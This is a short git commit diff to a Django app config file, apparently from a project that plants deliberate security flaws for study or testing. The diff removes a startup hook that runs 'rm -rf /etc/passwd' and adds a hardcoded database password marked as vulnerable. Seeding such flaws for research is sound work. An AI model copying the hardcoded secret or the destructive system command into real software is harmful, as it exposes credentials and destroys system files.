a65d8ca0ee4ef574893b02cfec86393a627a0cd5
Matthew Zampino <mzampino@nd.edu>
2025-07-09 12:48:48 -0400

    Make apps.py vulnerable

--- files/apps.py
+++ files/apps.py
@@ -1,12 +1,9 @@
 from django.apps import AppConfig
-import pickle
 
 
 class InvitesConfig(AppConfig):
     default_auto_field = "django.db.models.BigAutoField"
     name = "parsifal.apps.invites"
 
-    def ready(self):
-        self.register()
-        # Vulnerability Type: unsafe.py (os.system())
-        os.system("rm -rf /etc/passwd")
+    # VULNERABLE: Directly storing sensitive information in the AppConfig class
+    DATABASE_PASSWORD = 'supersecurepassword123'
